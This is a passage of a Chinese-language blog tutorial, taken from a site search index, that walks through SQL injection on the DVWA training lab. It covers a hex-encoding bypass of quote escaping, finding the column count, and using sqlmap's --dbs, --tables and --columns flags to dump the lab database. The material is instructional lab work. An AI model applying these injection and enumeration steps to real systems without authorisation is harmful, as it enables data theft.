alt="image-20230630092016164"> </p><p>我们输入users之后，发现没有如何反应</p><p>通过源代码我们可以知道，发现它对单引号进行了转义，我们采用16进制绕过，得知users的十六进制为 0x75736572</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092022406.png" alt="image-20230630092022406"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092029237.png" alt="image-20230630092029237"></p><p> (7)获取数据</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092046389.png" alt="image-20230630092046389"></p><p> 3.high级别</p><p>（1）判断注入类型</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092056445.png" alt="image-20230630092056445"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092117439.png" alt="image-20230630092117439"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092126461.png" alt="image-20230630092126461"></p><p>我们可以知道是字符型注入</p><p>(2)判断列数</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092139528.png" alt="image-20230630092139528"> </p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092146715.png" alt="image-20230630092146715"></p><p>列数为2列，我们可以发现high级别和low级别的步骤是一样的，所以我在这里就不写了，可以参考low级别的步骤就行了<br>六.SQL Injection (Blind)</p><p>我们在讲SQL Injection (Blind)之前，先讲一下什么是sqlmap注入。</p><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等。</p><p>Sqlmap采用了以下5种独特的SQL注入技术</p><pre><code>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中联合查询注入，在可以使用Union的情况下注入堆查询注入，可以同时执行多条语句时的注入</code></pre><p>Sqlmap的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。</p><p>sqlmap是一个跨平台的工具，很好用，是SQL注入方面一个强大的工具！</p><p>我们可以使用 -h 参数查看sqlmap的参数以及用法，sqlmap  -h</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092157700.png" alt="image-20230630092157700"></p><p> sqlmap的使用方法:sqlmap -u  url 是对网站进行注入  </p><pre><code>                            sqlmap -r  是对文件进行注入       </code></pre><p>这里我们对SQL Injection的low级别进行sqlmap，具体过程我写在了图片上面</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092240622.png" alt="image-20230630092240622"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092251918.png" alt="image-20230630092251918"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092317769.png" alt="image-20230630092317769"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092331232.png" alt="image-20230630092331232"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092339570.png" alt="image-20230630092339570"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092352745.png" alt="image-20230630092352745"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092403787.png" alt="image-20230630092403787"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092413572.png" alt="image-20230630092413572"></p><p>1.low级别</p><p>(1)我们先进行抓包</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092422081.png" alt="image-20230630092422081"></p><p> (2)然后使用sqlmap</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092430324.png" alt="image-20230630092430324"> </p><p>(3)爆破数据库              –dbs</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092444925.png" alt="image-20230630092444925"></p><p> (4)爆破表名                             -D ‘dvwa’ –tables</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092504122.png" alt="image-20230630092504122"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092521378.png" alt="image-20230630092521378"></p><p> (5)爆破字段名    -D ‘dvwa’  -T ‘ guestbook’ –columns</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092532169.png" alt="image-20230630092532169"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092538796.png" alt="image-20230630092538796"></p><p> (6)爆破数据</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092544177.png" alt="image-20230630092544177"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092550005.png" alt="image-20230630092550005"> </p><p>后面的我们都可以使用sqlmap进行注入,所以后面的就在这里不讲解了。</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/OIP.cgzOSsYiK2tlhL3PridOVwHaE_" alt="谢谢阅读图片 的图像结果"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
